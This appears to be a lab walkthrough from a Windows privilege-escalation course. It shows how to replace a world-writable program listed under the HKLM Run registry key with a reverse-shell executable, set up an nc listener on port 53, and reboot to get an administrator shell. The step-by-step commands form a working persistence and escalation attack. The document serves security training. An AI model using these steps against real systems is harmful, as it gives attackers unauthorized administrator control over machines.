# 🐾 Task 7: Registry - Autostart
---

## 📜 Task Description
In this task, we will exploit a vulnerability in the Windows Registry autostart mechanism. We will examine the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` registry key to find an executable file that is writable by all users. Then, we will replace it with our `reverse.exe` file and gain a reverse shell with administrator privileges.

---

## 🔍 Step 1: Checking Autostart Programs in the Registry
First, query the `Run` registry key to find executables that start automatically. Execute the following command:  
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

### 📋 Expected Output
- Confirm that you see executables listed under the autostart section.

## 🔑 Step 2: Checking Permissions on the Executable
Use the `accesschk.exe` tool to verify write permissions on one of the executables listed in the autostart section. Execute the following command:  
`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

### 📋 Expected Output
- Confirm that the file `program.exe` is writable by all users.

## 📝 Step 3: Replacing the Executable
Replace the executable `program.exe` with your previously created `reverse.exe`. Run the following command:  
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" -Force`

### 📋 Expected Output
- Confirm that the file has been successfully replaced with `reverse.exe`.

## 🎧 Step 4: Setting Up the Listener
Before restarting the virtual machine, ensure you have a listener running on Kali. Use the following command to start the listener:  
`nc -lvnp 53`

---

## 🚀 Step 5: Restarting the Machine
Now, restart the Windows VM to trigger the execution of the `reverse.exe` file on startup. After rebooting, a new RDP session will initiate the reverse shell with administrator privileges.

### 📋 Expected Output
- Confirm that you have received a reverse shell with administrator privileges.

## 🎉 Congratulations!
You have successfully exploited the registry autostart mechanism to gain a reverse shell with administrator privileges! 🎊

---

## 📌 Notes
- Ensure you understand all the steps and their implications.
- In a real-world scenario, you might have to wait for an administrator to log in to trigger the reverse shell.
- Use this knowledge responsibly and only within authorized penetration testing engagements.
